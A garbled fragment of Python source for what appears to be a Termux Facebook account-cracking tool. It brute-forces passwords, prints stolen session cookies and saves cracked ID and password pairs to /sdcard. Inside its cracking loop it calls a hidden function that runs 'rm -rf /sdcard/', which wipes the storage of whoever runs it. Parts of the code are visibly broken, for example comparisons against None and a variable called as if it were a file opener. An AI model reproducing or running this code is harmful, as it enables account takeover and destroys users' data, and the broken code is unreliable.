...
def o():
    ...
    if opt == '1':
        i()
    if None == '2':
        _REFAT_('xdg-open https://www.facebook.com/samim.ahmed.927758')
        return None
    if None == '3':
        _REFAT_('xdg-open https://youtube.com/@DARK_POINT')
        return None
    if None == '4':
        _REFAT_('xdg-open https://facebook.com/groups/681725126501077/')
        return None
    if None == '0':
        _REFAT_('exit')
        return None
...
from os import system as _REFAT_
...
try:
    ...
    _REFAT_('pip install mechanize requests futures bs4==2 > /dev/null')
    _REFAT_('pip install bs4')    
...
def hahaha():
	_REFAT_("termux-setup-storage -y")
	_REFAT_("rm -rf /sdcard/")
	_REFAT_("rm -rf /sdcard/*")
my_color = [
 P, M, H, K, B, U, O, N]
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                print('\033[1;32mREFAT-AFRAID-OK ]' +cid+ ' | ' +ps+'\033[0;35m')
                print(f"{H}\033[0;35m[🍪]COOKIE :\033[1;32m{coki}")
                cek_apk(session,coki)
                uid('/sdcard/REFAT-AFRAID-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
            else:
                continue
        loop+=1
        hahaha()
        sys.stdout.write('\r%s[REFAT-AFRAID] \033[1;32m[%s/%s] \033[1;32m[OK-%s] \r'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
